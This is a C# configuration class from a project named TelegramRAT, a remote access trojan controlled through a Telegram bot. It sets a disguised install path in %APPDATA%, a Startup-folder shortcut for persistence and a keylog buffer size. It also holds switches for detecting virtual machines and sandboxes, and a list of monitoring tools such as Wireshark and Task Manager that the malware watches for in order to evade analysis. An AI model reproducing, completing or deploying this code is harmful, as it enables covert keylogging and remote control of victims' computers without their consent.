namespace TelegramRAT
{
    public static class Config
    {
        public const string TelegramBot_Token = "INSERT_BOT_TOKEN"; 
        public const string TelegramChat_ID = "INSERT_TELEGRAM_CHAT_ID";
        public const int commandCheckerDelay = 1000; // ms
        public const int maxFileSize = 52428800; // 50MB

        public const string installPath = "%APPDATA%\\TelegramRAT\\RATAttack.exe";
        public const string startupPath = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RATAttack.lnk";
        public const bool logErrors  = true;
        public const string log_file = "RATlog.txt";

        public const int keylogSize = 20971520; // 20MB

        public static readonly bool checkForVMAndSandboxie  = false;
        public static readonly bool checkForPacketAnalyzers = false;
        public static string[] PacketAnalyzersList =
        {
            "taskmgr", "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain"
        };
    }
}
